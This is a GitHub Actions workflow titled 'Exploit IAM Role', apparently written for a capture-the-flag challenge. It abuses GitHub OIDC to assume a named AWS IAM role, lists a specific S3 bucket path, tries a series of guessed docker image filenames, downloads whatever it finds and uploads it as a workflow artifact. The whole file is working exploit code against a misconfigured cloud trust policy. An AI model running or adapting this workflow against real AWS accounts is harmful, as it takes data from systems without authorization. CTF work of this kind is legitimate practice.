name: Exploit IAM Role
on:
  push:
    branches: [ main ]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    outputs:
      image_path: ${{ steps.set_image_path.outputs.image_path }}
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configure AWS Credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: ap-east-1
          role-session-name: ctf-session

      - name: Show caller identity (verify assume-role)
        run: aws sts get-caller-identity || true

      - name: List S3 objects in challenge folder
        run: |
          echo "Listing S3 path..."
          aws s3 ls s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/ --recursive || true

      - name: Try to download likely docker image files
        run: |
          mkdir -p /tmp/artifacts
          for name in docker-image.tar image.tar challenge-image.tar image.tar.gz docker_image.tar; do
            echo "attempting to download: $name"
            aws s3 cp "s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/$name" "/tmp/artifacts/$name" || true
          done
          ls -lah /tmp/artifacts || true

      - name: Determine image path and set job output
        id: set_image_path
        run: |
          # find the first plausible artifact and set it as the step output
          found=""
          for f in /tmp/artifacts/*; do
            [ -e "$f" ] || continue
            # ignore empty dir listings
            if [ -f "$f" ]; then
              found="$f"
              break
            fi
          done

          if [ -n "$found" ]; then
            echo "Found image: $found"
            # Set step output 'image_path' (write to GITHUB_OUTPUT)
            echo "image_path=${found}" >> "$GITHUB_OUTPUT"
          else
            echo "No image found"
            echo "image_path=" >> "$GITHUB_OUTPUT"
            exit 0
          fi

      - name: Upload found artifacts
        if: ${{ steps.set_image_path.outputs.image_path != '' }}
        uses: actions/upload-artifact@v4
        with:
          name: downloaded-images
          path: ${{ steps.set_image_path.outputs.image_path }}
